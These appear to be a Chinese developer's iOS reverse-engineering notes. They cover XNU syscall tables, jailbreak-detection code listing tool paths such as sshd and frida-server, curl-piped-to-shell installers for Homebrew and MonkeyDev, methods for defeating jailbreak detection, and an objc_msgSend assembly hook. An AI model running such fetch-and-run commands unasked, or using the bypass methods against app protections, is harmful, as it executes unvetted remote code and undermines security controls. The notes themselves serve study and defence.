 18 _kernelrpc_mach_port_deallocate_trap     800145f0 T
 19 _kernelrpc_mach_port_mod_refs_trap       8001462c T
 20 _kernelrpc_mach_port_move_member_trap    8001466c T
 21 _kernelrpc_mach_port_insert_right_trap   800146b0 T
 22 _kernelrpc_mach_port_insert_member_trap  80014710 T
 23 _kernelrpc_mach_port_extract_member_trap 80014754 T
 26 mach_reply_port                          8001b5b4 T
 27 thread_self_trap                         8001b598 T
 28 task_self_trap                           8001b578 T
 29 host_self_trap                           80019910 T
 31 mach_msg_trap                            80014ec0 T
 32 mach_msg_overwrite_trap                  80014d20 T
 33 semaphore_signal_trap                    80027188 T
 34 semaphore_signal_all_trap                8002720c T
 35 semaphore_signal_thread_trap             80027114 T
 36 semaphore_wait_trap                      800274b0 T
 37 semaphore_wait_signal_trap               80027658 T
 38 semaphore_timedwait_trap                 80027598 T
 39 semaphore_timedwait_signal_trap          8002773c T
 44 task_name_for_pid                        8021a838 T
 45 task_for_pid                             8021a688 T
 46 pid_for_task                             8021a63c T
 48 macx_swapon                              8021b414 T
 49 macx_swapoff                             8021b668 T
 51 macx_triggers                            8021b3f4 T
 52 macx_backing_store_suspend               8021b370 T
 53 macx_backing_store_recovery              8021b318 T
 58 pfz_exit                                 80027818 T
 59 swtch_pri                                800278e4 T
 60 swtch                                    8002781c T
 61 thread_switch                            80027ad4 T
 62 clock_sleep_trap                         80017520 T
 89 mach_timebase_info_trap                  80016658 T
 90 mach_wait_until_trap                     80016d20 T
 91 mk_timer_create_trap                     8001f2f4 T
 92 mk_timer_destroy_trap                    8001f500 T
 93 mk_timer_arm_trap                        8001f544 T
 94 mk_timer_cancel_trap                     8001f5c8 T
100 iokit_user_client_trap                   8026c11c T
```
## Apple提供的System Call Table 可以查出函数的编号
```

1. exit                  801d4a74 T
2. fork                  801d7980 T
3. read                  801eb584 T
4. write                 801eb958 T
5. open                  800b13a4 T
6. close                 801ccab4 T
7. wait4                 801d56bc T
9. link                  800b18e8 T
10. unlink               800b1ff0 T
12. chdir                800b0c60 T
13. fchdir               800b0af0 T
14. mknod                800b14bc T
15. chmod                800b2b40 T
16. chown                800b2c9c T
18. getfsstat            800b088c T
20. getpid               801dc20c T
23. setuid               801dc4c0 T
24. getuid               801dc290 T
25. geteuid              801dc2a0 T
26. ptrace               801e812c T
27. recvmsg              8020a8fc T
28. sendmsg              8020a444 T
29. recvfrom             8020a528 T
30. accept               80209dfc T
31. getpeername          8020abc8 T
32. getsockname          8020ab18 T
33. access               800b24ac T
34. chflags              800b2928 T
35. fchflags             800b29f0 T
36. sync                 800b0320 T
37. kill                 801dfdcc T
39. getppid              801dc214 T
41. dup                  801cab04 T
42. pipe                 801edbe4 T
43. getegid              801dc318 T
46. sigaction            801deee8 T
47. getgid               801dc308 T
48. sigprocmask          801df42c T
49. getlogin             801dd0e8 T
50. setlogin             801dd160 T
51. acct                 801c54ec T
52. sigpending           801df5d0 T
53. sigaltstack          801dfd10 T
54. ioctl                801ebd1c T
55. reboot               801e8090 T
56. revoke               800b43f8 T
57. symlink              800b1b58 T
58. readlink             800b282c T
59. execve               801d4448 T
60. umask                800b43d0 T
61. chroot               800b0d30 T
65. msync                801d84d0 T
66. vfork                801d7018 T
73. munmap               801d857c T
74. mprotect             801d85b0 T
75. madvise              801d8668 T
78. mincore              801d86d4 T
79. getgroups            801dc328 T
80. setgroups            801dd02c T
81. getpgrp              801dc21c T
82. setpgid              801dc3c8 T
83. setitimer            801e7b78 T
85. swapon               8021be68 T
86. getitimer            801e7a30 T
89. getdtablesize        801ca6dc T
90. dup2                 801caf54 T
92. fcntl                801cb420 T
93. select               801ebfc8 T
95. fsync                800b3238 T
96. setpriority          801dd494 T
97. socket               802098a4 T
98. connect              80209e1c T
100. getpriority          801dd388 T
104. bind                 80209970 T
105. setsockopt           8020aa30 T
106. listen               80209adc T
 111. sigsuspend           801df5f8 T
116. gettimeofday         801e7840 T
117. getrusage            801de22c T
118. getsockopt           8020aa94 T
120. readv                801eb810 T
121. writev               801ebbb0 T
122. settimeofday         801e789c T
123. fchown               800b2dac T
124. fchmod               800b2c70 T
126. setreuid             801dc80c T
127. setregid             801dcba0 T
128. rename               800b3428 T
131. flock                801ce20c T
132. mkfifo               800b1798 T
133. sendto               8020a168 T
134. shutdown             8020aa00 T
135. socketpair           8020a00c T
136. mkdir                800b3d1c T
137. rmdir                800b3d5c T
138. utimes               800b2e60 T
139. futimes              800b3034 T
140. adjtime              801e79a0 T
142. gethostuuid          801ed6a4 T
147. setsid               801dc384 T
151. getpgid              801dc224 T
152. setprivexec          801dc1f4 T
153. pread                801eb774 T
154. pwrite               801ebad0 T
157. statfs               800b03c0 T
158. fstatfs              800b0678 T
159. unmount              800afe88 T
165. quotactl             800b03bc T
167. mount                800af068 T
169. csops                801dafd0 T
170. 170  old table       801db4bc T
173. waitid               801d5ab4 T
180. kdebug_trace         801c2db4 T
181. setgid               801dc9a4 T
182. setegid              801dcab0 T
183. seteuid              801dc710 T
184. sigreturn            8021e7e4 T
185. chud                 8021d4f4 T
187. fdatasync            800b32b0 T
188. stat                 800b2588 T
189. fstat                801ccfec T
190. lstat                800b26d4 T
191. pathconf             800b27c8 T
192. fpathconf            801cd048 T
194. getrlimit            801de074 T
195. setrlimit            801dd93c T
196. getdirentries        800b3f94 T
197. mmap                 801d7fc0 T
199. lseek                800b2068 T
200. truncate             800b30b4 T
201. ftruncate            800b3174 T
202. __sysctl             801e2478 T
203. mlock                801d8820 T
204. munlock              801d8878 T
205. undelete             800b1cf0 T
216. mkcomplex            800b12c4 T
220. getattrlist          8009b060 T
221. setattrlist          8009b0d8 T
222. getdirentriesattr    800b44e0 T
223. exchangedata         800b469c T
225. searchfs             800b48dc T
226. delete               800b202c T
227. copyfile             800b32cc T
228. fgetattrlist         80098488 T
229. fsetattrlist         8009b7e0 T
230. poll                 801ec72c T
231. watchevent           801ed054 T
232. waitevent            801ed1f8 T
233. modwatch             801ed368 T
234. getxattr             800b5550 T
235. fgetxattr            800b568c T
236. setxattr             800b578c T
237. fsetxattr            800b5898 T
238. removexattr          800b5994 T
239. fremovexattr         800b5a5c T
240. listxattr            800b5b1c T
241. flistxattr           800b5c00 T
242. fsctl                800b4dd4 T
243. initgroups           801dcea8 T
244. posix_spawn          801d351c T
245. ffsctl               800b5474 T
250. minherit             801d8630 T
266. shm_open             8020eb24 T
267. shm_unlink           8020f604 T
268. sem_open             8020df80 T
269. sem_close            8020e718 T
270. sem_unlink           8020e4e0 T
271. sem_wait             8020e76c T
272. sem_trywait          8020e834 T
273. sem_post             8020e8d8 T
274. sem_getvalue         8020e97c T
275. sem_init             8020e974 T
276. sem_destroy          8020e978 T
277. open_extended        800b11d8 T
278. umask_extended       800b4380 T
279. stat_extended        800b2530 T
280. lstat_extended       800b267c T
281. fstat_extended       801ccdd0 T
282. chmod_extended       800b2a30 T
283. fchmod_extended      800b2b74 T
284. access_extended      800b21a0 T
285. settid               801dcd2c T
286. gettid               801dc2b0 T
287. setsgroups           801dd03c T
288. getsgroups           801dc37c T
289. setwgroups           801dd040 T
290. getwgroups           801dc380 T
291. mkfifo_extended      800b16f4 T
292. mkdir_extended       800b3b30 T
294. shared_region_check_np 8021c3a4 T
296. vm_pressure_monitor  8021cb08 T
297. psynch_rw_longrdlock 802159ac T
298. psynch_rw_yieldwrlock 80215c60 T
299. psynch_rw_downgrade  80215c68 T
300. psynch_rw_upgrade    80215c64 T
301. psynch_mutexwait     80212bd8 T
302. psynch_mutexdrop     80213b9c T
303. psynch_cvbroad       80213bf0 T
304. psynch_cvsignal      802141c0 T
305. psynch_cvwait        80214648 T
306. psynch_rw_rdlock     80214d7c T
307. psynch_rw_wrlock     802159b0 T
308. psynch_rw_unlock     80215c6c T
309. psynch_rw_unlock2    80215f64 T
310. getsid               801dc254 T
311. settid_with_pid      801dcdcc T
312. psynch_cvclrprepost  80214c7c T
313. aio_fsync            801c5ed0 T
314. aio_return           801c60a8 T
315. aio_suspend          801c6330 T
316. aio_cancel           801c5a48 T
317. aio_error            801c5e24 T
318. aio_read             801c6088 T
319. aio_write            801c6544 T
320. lio_listio           801c6564 T
322. iopolicysys          801de420 T
323. process_policy       8021a72c T
324. mlockall             801d88b4 T
325. munlockall           801d88b8 T
327. issetugid            801dc4b0 T
328. __pthread_kill       801dfa44 T
329. __pthread_sigmask    801dfaa4 T
330. __sigwait            801dfb54 T
331. __disable_threadsignal 801df720 T
332. __pthread_markcancel 801df73c T
333. __pthread_canceled   801df784 T
334. __semwait_signal     801df924 T
336. proc_info            80218618 T
338. stat64               800b25d4 T
339. fstat64              801cd028 T
340. lstat64              800b2720 T
341. stat64_extended      800b2624 T
342. lstat64_extended     800b2770 T
343. fstat64_extended     801cd00c T
344. getdirentries64      800b4340 T
345. statfs64             800b06e0 T
346. fstatfs64            800b0828 T
347. getfsstat64          800b0a38 T
348. __pthread_chdir      800b0d28 T
349. __pthread_fchdir     800b0c58 T
350. audit                801c1a74 T
351. auditon              801c1a78 T
353. getauid              801c1a7c T
354. setauid              801c1a80 T
357. getaudit_addr        801c1a84 T
358. setaudit_addr        801c1a88 T
359. auditctl             801c1a8c T
360. bsdthread_create     80216ab8 T
361. bsdthread_terminate  80216d30 T
362. kqueue               801cf594 T
363. kevent               801cf614 T
364. lchown               800b2d94 T
365. stack_snapshot       801c520c T
366. bsdthread_register   80216d94 T
367. workq_open           802179e8 T
368. workq_kernreturn     80217e50 T
369. kevent64             801cf8ac T
370. __old_semwait_signal 801df7f8 T
371. __old_semwait_signal_nocancel 801df82c T
372. thread_selfid        80218354 T
373. ledger               801ed70c T
380. __mac_execve         801d4468 T
381. __mac_syscall        8027d0a8 T
382. __mac_get_file       8027cd50 T
383. __mac_set_file       8027cf98 T
384. __mac_get_link       8027ce74 T
385. __mac_set_link       8027d098 T
386. __mac_get_proc       8027c844 T
387. __mac_set_proc       8027c904 T
388. __mac_get_fd         8027cbfc T
389. __mac_set_fd         8027ce84 T
390. __mac_get_pid        8027c778 T
391. __mac_get_lcid       8027c9b8 T
392. __mac_get_lctx       8027ca7c T
393. __mac_set_lctx       8027cb38 T
394. setlcid              801dd228 T
395. getlcid              801dd310 T
396. read_nocancel        801eb5a4 T
397. write_nocancel       801eb978 T
398. open_nocancel        800b1434 T
399. close_nocancel       801ccad0 T
400. wait4_nocancel       801d56dc T
401. recvmsg_nocancel     8020a91c T
402. sendmsg_nocancel     8020a464 T
403. recvfrom_nocancel    8020a548 T
404. accept_nocancel      80209b1c T
405. msync_nocancel       801d84e8 T
406. fcntl_nocancel       801cb440 T
407. select_nocancel      801ebfe4 T
408. fsync_nocancel       800b32a8 T
409. connect_nocancel     80209e34 T
410. sigsuspend_nocancel  801df6b4 T
411. readv_nocancel       801eb830 T
412. writev_nocancel      801ebbd0 T
413. sendto_nocancel      8020a188 T
414. pread_nocancel       801eb794 T
415. pwrite_nocancel      801ebaf0 T
416. waitid_nocancel      801d5ad0 T
417. poll_nocancel        801ec74c T
420. sem_wait_nocancel    8020e788 T
421. aio_suspend_nocancel 801c6350 T
422. __sigwait_nocancel   801dfb8c T
423. __semwait_signal_nocancel 801df958 T
424. __mac_mount          800af08c T
425. __mac_get_mount      8027d2a0 T
426. __mac_getfsstat      800b08b0 T
427. fsgetpath            800b5ce4 T
428. audit_session_self   801c1a68 T
429. audit_session_join   801c1a6c T
430. fileport_makeport    801ce2f0 T
431. fileport_makefd      801ce494 T
432. audit_session_port   801c1a70 T
433. pid_suspend          8021c180 T
434. pid_resume           8021c1f0 T
435. pid_hibernate        8021c268 T
436. pid_shutdown_sockets 8021c2c0 T
438. shared_region_map_and_slide_np 8021c954 T
439. kas_info             8021cb50 T   ; Provides ASLR information to user space 
                                       ; (intentionally crippled in iOS, works in ML)
440. memorystatus_control 801e62a0 T   ;; Controls JetSam - supersedes old sysctl interface
441. guarded_open_np      801cead0 T  
442. guarded_close_np     801cebdc T

```

## iPhoneIsJailbroken
```
#import "iPhoneIsJailbroken.h"
#import <dlfcn.h>
#import <mach-o/dyld.h>
#import <TargetConditionals.h>

@implementation iPhoneIsJailbroken

#define A(c)            (c) - 0x19
#define HIDE_STR(str)   do { char *p = str;  while (*p) *p++ -= 0x19; } while (0)
typedef int (*ptrace_ptr_t)(int _request, pid_t _pid, caddr_t _addr, int _data);
#if !defined(PT_DENY_ATTACH)
#define PT_DENY_ATTACH 31
#endif

BOOL DEBUGGING = YES;

#if TARGET_IPHONE_SIMULATOR && !defined(LC_ENCRYPTION_INFO)
#define LC_ENCRYPTION_INFO 0x21
struct encryption_info_command {
    uint32_t cmd;
    uint32_t cmdsize;
    uint32_t cryptoff;
    uint32_t cryptsize;
    uint32_t cryptid;
};
#endif

void LOG(NSString* loc)
{
    NSLog(@"Found: %@", loc);
}

CFRunLoopSourceRef gSocketSource;
BOOL fileExist(NSString* path)
{
    NSFileManager *fileManager = [NSFileManager defaultManager];
    BOOL isDirectory = NO;
    if([fileManager fileExistsAtPath:path isDirectory:&isDirectory]){
        return YES;
    }
    return NO;
}

BOOL directoryExist(NSString* path)
{
    NSFileManager *fileManager = [NSFileManager defaultManager];
    BOOL isDirectory = YES;
    if([fileManager fileExistsAtPath:path isDirectory:&isDirectory]){
        return YES;
    }
    return NO;
}

BOOL canOpen(NSString* path)
{
    FILE *file = fopen([path UTF8String], "r");
    if(file==nil){
        return fileExist(path) || directoryExist(path);
    }
    fclose(file);
    return YES;
}

// Preventing libobjc hooked, strstr implementation
const char* tuyul(const char* X, const char* Y)
{
    if (*Y == '\0')
        return X;

    for (int i = 0; i < strlen(X); i++)
    {
        if (*(X + i) == *Y)
        {
            char* ptr = tuyul(X + i + 1, Y + 1);
            return (ptr) ? ptr - 1 : NULL;
        }
    }

    return NULL;
}

BOOL isJb()
{
//    Check cydia URL
    if([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"cydia://package/com.avl.com"]])
    {
        return YES;
    }
    NSArray* checks = [[NSArray alloc]initWithObjects:@"/Application/Cydia.app",
                       @"/Library/MobileSubstrate/MobileSubstrate.dylib",
                       @"/bin/bash",
                       @"/usr/sbin/sshd",
                       @"/etc/apt",
                       @"/usr/bin/ssh",
                       @"/private/var/lib/apt",
                       @"/private/var/lib/cydia",
                       @"/private/var/tmp/cydia.log",
                       @"/Applications/WinterBoard.app",
                       @"/var/lib/cydia",
                       @"/private/etc/dpkg/origins/debian",
                       @"/bin.sh",
                       @"/private/etc/apt",
                       @"/etc/ssh/sshd_config",
                       @"/private/etc/ssh/sshd_config",
                       @"/Applications/SBSetttings.app",
                       @"/private/var/mobileLibrary/SBSettingsThemes/",
                       @"/private/var/stash",
                       @"/usr/libexec/sftp-server",
                       @"/usr/libexec/cydia/",
                       @"/usr/sbin/frida-server",
                       @"/usr/bin/cycript",
                       @"/usr/local/bin/cycript",
                       @"/usr/lib/libcycript.dylib",
                       @"/System/Library/LaunchDaemons/com.saurik.Cydia.Startup.plist",
                       @"/System/Library/LaunchDaemons/com.ikey.bbot.plist",
                       @"/Applications/FakeCarrier.app",
                       @"/Library/MobileSubstrate/DynamicLibraries/Veency.plist",
                       @"/Library/MobileSubstrate/DynamicLibraries/LiveClock.plist",
                       @"/usr/libexec/ssh-keysign",
                       @"/usr/libexec/sftp-server",
                       @"/Applications/blackra1n.app",
                       @"/Applications/IntelliScreen.app",
                       @"/Applications/Snoop-itConfig.app",
                       @"/var/checkra1n.dmg",
                       @"/var/binpack",
                       nil];
    //Check installed app
    for(NSString* check in checks)
    {
        if(canOpen(check))
        {
            if(DEBUGGING){LOG(check);}
            return YES;
        }
    }
    //symlink verification
    struct stat sym;
    if(lstat("/Applications", &sym) || lstat("/var/stash/Library/Ringtones", &sym) ||
       lstat("/var/stash/Library/Wallpaper", &sym) ||
       lstat("/var/stash/usr/include", &sym) ||
       lstat("/var/stash/usr/libexec", &sym)  ||
       lstat("/var/stash/usr/share", &sym) ||
       lstat("/var/stash/usr/arm-apple-darwin9", &sym))
    {
        if(sym.st_mode & S_IFLNK)
        {
            if(DEBUGGING){LOG(@"Symlink");}
            return YES;
        }
    }
    
    //Check process forking
    int pid = fork();
    if(!pid)
    {
        exit(1);
    }
    if(pid >= 0)
    {
        if(DEBUGGING){LOG(@"Fork");}
        return YES;
    }
    
    //Check permission to write to /private
    NSString *path = @"/private/avl.txt";
    NSFileManager *fileManager = [NSFileManager defaultManager];
    @try {
        NSError* error;
        NSString *test = @"AVL was here";
        [test writeToFile:test atomically:NO encoding:NSStringEncodingConversionAllowLossy error:&error];
        [fileManager removeItemAtPath:path error:nil];
        if(error==nil)
        {
            if(DEBUGGING){LOG(@"File creation");}
            return YES;
        }
        return NO;
    } @catch (NSException *exception) {
        return NO;
    }
}

char* UNHIDE_STR(char* str){
    do { char *p = str;  while (*p) *p++ += 0x19; } while (0);
    return str;
}

char* decryptString(char* str){
    str = UNHIDE_STR(str);
    str[strlen(str)]='\0';
    return str;
}

BOOL isInjectedWithDynamicLibrary()
{
    int i=0;
    while(true){
        const char *name = _dyld_get_image_name(i++);
        if(name==NULL){
            break;
        }
        if (name != NULL) {
            char cyinjectHide[] = {
                A('c'),
                A('y'),
                A('i'),
                A('n'),
                A('j'),
                A('e'),
                A('c'),
                A('t'),
                0
            };
            char libcycriptHide[] = {
                A('l'),
                A('i'),
                A('b'),
                A('c'),
                A('y'),
                A('c'),
                A('r'),
                A('i'),
                A('p'),
                A('t'),
                0
            };
            
            char libfridaHide[] = {
                A('F'),
                A('r'),
                A('i'),
                A('d'),
                A('a'),
                A('G'),
                A('a'),
                A('d'),
                A('g'),
                A('e'),
                A('t'),
                0
            };
            char zzzzLibertyDylibHide[] = {
                A('z'),
                A('z'),
                A('z'),
                A('z'),
                A('L'),
                A('i'),
                A('b'),
                A('e'),
                A('r'),
                A('t'),
                A('y'),
                A('.'),
                A('d'),
                A('y'),
                A('l'),
                A('i'),
                A('b'),
                0
            };
            char sslkillswitch2dylib[] = {
                A('S'),
                A('S'),
                A('L'),
                A('K'),
                A('i'),
                A('l'),
                A('l'),
                A('S'),
                A('w'),
                A('i'),
                A('t'),
                A('c'),
                A('h'),
                A('2'),
                A('.'),
                A('d'),
                A('y'),
                A('l'),
                A('i'),
                A('b'),
                0
            };
            
            char zeroshadowdylib[] = {
                A('0'),
                A('S'),
                A('h'),
                A('a'),
                A('d'),
                A('o'),
                A('w'),
                A('.'),
                A('d'),
                A('y'),
                A('l'),
                A('i'),
                A('b'),
                0
            };
            
            char mobilesubstratedylib[] = {
                A('M'),
                A('o'),
                A('b'),
                A('i'),
                A('l'),
                A('e'),
                A('S'),
                A('u'),
                A('b'),
                A('s'),
                A('t'),
                A('r'),
                A('a'),
                A('t'),
                A('e'),
                A('.'),
                A('d'),
                A('y'),
                A('l'),
                A('i'),
                A('b'),
                0
            };
            
            char libsparkapplistdylib[] = {
                A('l'),
                A('i'),
                A('b'),
                A('s'),
                A('p'),
                A('a'),
                A('r'),
                A('k'),
                A('a'),
                A('p'),
                A('p'),
                A('l'),
                A('i'),
                A('s'),
                A('t'),
                A('.'),
                A('d'),
                A('y'),
                A('l'),
                A('i'),
                A('b'),
                0
            };
            
            char SubstrateInserterdylib[] = {
                A('S'),
                A('u'),
                A('b'),
                A('s'),
                A('t'),
                A('r'),
                A('a'),
                A('t'),
                A('e'),
                A('I'),
                A('n'),
                A('s'),
                A('e'),
                A('r'),
                A('t'),
                A('e'),
                A('r'),
                A('.'),
                A('d'),
                A('y'),
                A('l'),
                A('i'),
                A('b'),
                0
            };
            
            char zzzzzzUnSubdylib[] = {
                A('z'),
                A('z'),
                A('z'),
                A('z'),
                A('z'),
                A('z'),
                A('U'),
                A('n'),
                A('S'),
                A('u'),
                A('b'),
                A('.'),
                A('d'),
                A('y'),
                A('l'),
                A('i'),
                A('b'),
                0
                
            };
            
            char kor[] = {
                A('.'),
                A('.'),
                A('.'),
                A('!'),
                A('@'),
                A('#'),
                0
            };
            char cephei[] = {
                A('/'),A('u'),A('s'),A('r'),A('/'),A('l'),A('i'),A('b'),A('/'),A('C'),A('e'),A('p'),A('h'),A('e'),A('i'),A('.'),A('f'),A('r'),A('a'),A('m'),A('e'),A('w'),A('o'),A('r'),A('k'),A('/'),A('C'),A('e'),A('p'),A('h'),A('e'),A('i'),
                0
            };
            if (tuyul(name, decryptString(cephei)) != NULL){
                if(DEBUGGING){LOG([[NSString alloc] initWithFormat:@"%s", name]);}
                return YES;
            }
            if (tuyul(name, decryptString(kor)) != NULL){
                if(DEBUGGING){LOG([[NSString alloc] initWithFormat:@"%s", name]);}
                return YES;
            }
            if (tuyul(name, decryptString(mobilesubstratedylib)) != NULL){
                if(DEBUGGING){LOG([[NSString alloc] initWithFormat:@"%s", name]);}
                return YES;
            }
            if(tuyul(name, decryptString(libsparkapplistdylib)) != NULL){
                if(DEBUGGING){LOG([[NSString alloc] initWithFormat:@"%s", name]);}
                return YES;
            }
            if (tuyul(name, decryptString(cyinjectHide)) != NULL){
                if(DEBUGGING){LOG([[NSString alloc] initWithFormat:@"%s", name]);}
                return YES;
            }
            if (tuyul(name, decryptString(libcycriptHide)) != NULL){
                if(DEBUGGING){LOG([[NSString alloc] initWithFormat:@"%s", name]);}
                return YES;
            }
            if (tuyul(name, decryptString(libfridaHide)) != NULL){
                if(DEBUGGING){LOG([[NSString alloc] initWithFormat:@"%s", name]);}
                return YES;
            }
            if (tuyul(name, decryptString(zzzzLibertyDylibHide)) != NULL){
                if(DEBUGGING){LOG([[NSString alloc] initWithFormat:@"%s", name]);}
                return YES;
            }
            if (tuyul(name, decryptString(sslkillswitch2dylib)) != NULL){
                if(DEBUGGING){LOG([[NSString alloc] initWithFormat:@"%s", name]);}
                return YES;
            }
            if (tuyul(name, decryptString(zeroshadowdylib)) != NULL){
                if(DEBUGGING){LOG([[NSString alloc] initWithFormat:@"%s", name]);}
                return YES;
            }
            if (tuyul(name, decryptString(SubstrateInserterdylib)) != NULL){
                if(DEBUGGING){LOG([[NSString alloc] initWithFormat:@"%s", name]);}
                return YES;
            }
            if (tuyul(name, decryptString(zzzzzzUnSubdylib)) != NULL){
                if(DEBUGGING){LOG([[NSString alloc] initWithFormat:@"%s", name]);}
                return YES;
            }
        }
    }
    return NO;
}

// Returns true if the current process is being debugged (either
// running under the debugger or has a debugger attached post facto).
// Thanks to https://developer.apple.com/library/archive/qa/qa1361/_index.html
BOOL isDebugged()
{
    int junk;
    int mib[4];
    struct kinfo_proc info;
    size_t size;
    info.kp_proc.p_flag = 0;
    mib[0] = CTL_KERN;
    mib[1] = KERN_PROC;
    mib[2] = KERN_PROC_PID;
    mib[3] = getpid();
    size = sizeof(info);
    junk = sysctl(mib, sizeof(mib) / sizeof(*mib), &info, &size, NULL, 0);
    assert(junk == 0);
    return ( (info.kp_proc.p_flag & P_TRACED) != 0 );
}

BOOL isFromAppStore()
{
    #if TARGET_IPHONE_SIMULATOR
        return NO;
    #else
        NSString *provisionPath = [[NSBundle mainBundle] pathForResource:@"embedded" ofType:@"mobileprovision"];
        if (nil == provisionPath || 0 == provisionPath.length) {
            return YES;
        }
        return NO;
    #endif
}

BOOL isSecurityCheckPassed()
{
    if(TARGET_IPHONE_SIMULATOR)return NO;
    return !isJb() && !isInjectedWithDynamicLibrary() && !isDebugged();
    
}

@end
```

## Homebrew国内安装
### 自动脚本(全部国内地址)（在Mac终端中复制粘贴回车下面脚本)
安装脚本：
```
/bin/zsh -c "$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/Homebrew.sh)"
```
卸载脚本：
```
/bin/zsh -c "$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/HomebrewUninstall.sh)"
```

## curl: (35) LibreSSL SSL_connect: SSL_ERROR_SYSCALL in connection to raw.githubusercontent.com:443 
### 此处出现报错, 证明当前网络不行, 切换另外的网络/热点就行
```
$     sudo /bin/sh -c "$(curl -fsSL https://raw.githubusercontent.com/AloneMonkey/MonkeyDev/master/bin/md-install)"
curl: (35) LibreSSL SSL_connect: SSL_ERROR_SYSCALL in connection to raw.githubusercontent.com:443 
此处出现报错, 证明当前网络不行, 切换另外的网络/热点就行
Password:
$     sudo /bin/sh -c "$(curl -fsSL https://raw.githubusercontent.com/AloneMonkey/MonkeyDev/master/bin/md-install)"
Downloading MonkeyDev base from Github...
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 3452k  100 3452k    0     0   4256      0  0:13:50  0:13:50 --:--:-- 10751
Downloading Xcode templates from Github...
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  306k    0  306k    0     0  16915      0 --:--:--  0:00:18 --:--:-- 14798
Downloading frida-ios-dump from Github...
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  9669  100  9669    0     0   1012      0  0:00:09  0:00:09 --:--:--   396
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 11727  100 11727    0     0   3273      0  0:00:03  0:00:03 --:--:--  3273
Creating symlink to Xcode templates...
Modifying Bash personal initialization file...
   
```

## 如何检测越狱设备
为方便起见，“恶意应用程序”将指App Store中任何可主动实施越狱检测措施的应用程序。
在大多数情况下，越狱检测程序并不像人们想象的那么复杂。尽管应用程序可以采用多种方式对越狱设备进行检查，但通常可以归结为以下几点：

目录的存在 -流氓应用喜欢在文件系统中检查/Applications/Cydia.app/和/ private / var / stash等路径。
大多数情况下，这些是使用NSFileManager中的-（BOOL）fileExistsAtPath：（NSString *）path方法进行检查的，
但是更多偷偷摸摸的应用程序喜欢使用较低级别的C函数，例如fopen（），stat（）或access（）。

目录权限 -类似于检查目录是否存在，但是使用NSFileManager方法以及statfs（）之类的C函数来检查系统上特定文件和目录的Unix文件权限。
在越狱设备上的目录访问权限要比仍在监狱中的目录要多。

流程fork -沙盒不会拒绝App Store应用程序使用fork（），popen（）或任何其他C函数在越狱设备上创建子进程的能力。
沙盒明确拒绝在越狱中的设备上进行进程fork。通过检查fork（）上返回的pid，流氓应用程序可以判断它是否已成功fork，这时可以确定设备的越狱状态。

SSH环回连接 -只有极少数的应用程序可以实现此目的（因为它不如其他应用程序有效）。
由于安装了OpenSSH的越狱设备的比例很大，某些恶意应用程序将尝试在端口22上建立与127.0.0.1的连接。
如果连接成功，则表明OpenSSH已在设备上安装并运行，这显然表明越狱了

system（） -在监狱中的设备上使用NULL参数调用system（）函数将返回0；否则，将返回0。在越狱设备上执行相同操作将返回1。
这是因为该功能将检查是否/bin/sh存在，并且仅在越狱设备上才如此

dyld函数 -迄今为止最难解决的问题。调用诸如_dyld_image_count（）和_dyld_get_image_name（）之类的函数，以查看当前正在加载哪些dylib。
修补非常困难，因为修补本身就是dylib的一部分。

## 如何对iOS App进行逆向工程
为了从App Store中转储或反汇编应用程序，即使它是免费的应用程序，也必须首先将其解密（通常称为“ 砸壳 ”）。

在应用程序的解密二进制文件上使用class-dump将转储所有头文件。有时，它们包含“赠予”方法名称，
例如“ deviceIsJailbroken”或“ checkDeviceSecurity”。通常，挂接这些方法足以禁用越狱检测措施，但几乎可以保证该补丁将无法在其他应用程序上运行。

使用Objective-C解析功能在IDA中跟踪类似名称的方法可以帮助您准确地确定使用哪种方法来检测越狱。
如果类转储的头文件没有给出任何内容，则在二进制文件中搜索“ jail”，“ cydia”，“ apt”等字符串通常会导致断点。

----------------------------------------------------------------------------------------------------------------
# 汇编语言  Assembly

答：汇编语言是计算机语言，通俗来讲就是人类与计算机(CPU)交流的桥梁，
计算机不认识人类的语言，想要让计算机去完成人们的工作，就需要俺们将这些工作翻译成计算机语言，属于低级计算机语言。

iOS App与汇编语言的关系
一个APP安装到操作系统上面的可执行的文件本质上来讲就是二进制文件，操作系统本质上执行的指令也是二进制，是由CPU执行的；

## Assembly 和 fishhook
Objective-C的方法在编译后会走objc_msgSend，所以通过fishhook来hook这一个C函数即可获得Objective-C符号
由于objc_msgSend是变长参数，所以hook代码需要用汇编来实现：
```
 1//代码参考InspectiveC
 2__attribute__((__naked__))
 3static void hook_Objc_msgSend() {
 4    save()
 5    __asm volatile ("mov x2, lr\n");
 6    __asm volatile ("mov x3, x4\n");
 7    call(blr, &before_objc_msgSend)
 8    load()
 9    call(blr, orig_objc_msgSend)
10    save()
11    call(blr, &after_objc_msgSend)
12    __asm volatile ("mov lr, x0\n");
13    load()
14    ret()
15}
```
子程序调用时候要保存和恢复参数寄存器，
所以save和load分别对x0~x9, q0~q9入栈/出栈。
call则通过寄存器来间接调用函数：
```
 1#define save() \
 2__asm volatile ( \
 3"stp q6, q7, [sp, #-32]!\n"\
 4...
 5
 6#define load() \
 7__asm volatile ( \
 8"ldp x0, x1, [sp], #16\n" \
 9...
10
11#define call(b, value) \
12__asm volatile ("stp x8, x9, [sp, #-16]!\n"); \
13__asm volatile ("mov x12, %0\n" :: "r"(value)); \
14__asm volatile ("ldp x8, x9, [sp], #16\n"); \
15__asm volatile (#b " x12\n");
```
在before_objc_msgSend中用栈保存lr，在after_objc_msgSend恢复lr。
由于要生成trace文件，为了降低文件的大小，直接写入的是函数地址，且只有当前可执行文件的Mach-O(app和动态库)代码段才会写入：

iOS中，由于ALSR(https://en.wikipedia.org/wiki/Address_space_layout_randomization)的存在，在写入之前需要先减去偏移量slide：
```
1IMP imp = (IMP)class_getMethodImplementation(object_getClass(self), _cmd);
2unsigned long imppos = (unsigned long)imp;
3unsigned long addr = immpos - macho_slide
```
获取一个二进制的__text段地址范围：
```
1unsigned long size = 0;
2unsigned long start = (unsigned long)getsectiondata(mhp,  "__TEXT", "__text", &size);
3unsigned long end = start + size;
